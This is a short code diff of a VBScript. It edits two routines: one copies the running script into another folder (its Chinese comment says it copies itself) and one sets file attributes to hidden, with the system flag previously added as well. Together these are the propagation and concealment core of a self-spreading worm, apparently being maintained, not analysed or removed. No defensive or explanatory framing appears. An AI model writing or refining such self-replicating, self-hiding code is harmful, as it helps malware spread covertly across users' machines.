@@ -9,7 +9,7 @@ End Function
 
 Sub Propagate(targetPath) '复制自身到指定文件夹
 	Dim objFileSystem
-	Set objFileSystem = WScript.CreateObject("scripting.filesystemobject")
+	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
 	
 	sourcePath = objFileSystem.GetFile(Wscript.ScriptFullName)
 	sourceName = objFileSystem.GetFile(Wscript.ScriptFullName).Name
@@ -30,9 +30,9 @@ End Sub
 
 Sub HideFile(filePath)
 	Dim objFileSystem, objFile
-	Set objFileSystem = WScript.CreateObject("scripting.filesystemobject")
+	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
 	Set objFile = objFileSystem.GetFile(filePath)
-	objFile.Attributes = 4 + 2 '0-普通 1-只读 2-隐藏 4-系统
+	objFile.Attributes = 2 '0-普通 1-只读 2-隐藏 4-系统
 	Set objFileSystem = Nothing
 	Set objFile = Nothing
 End Sub
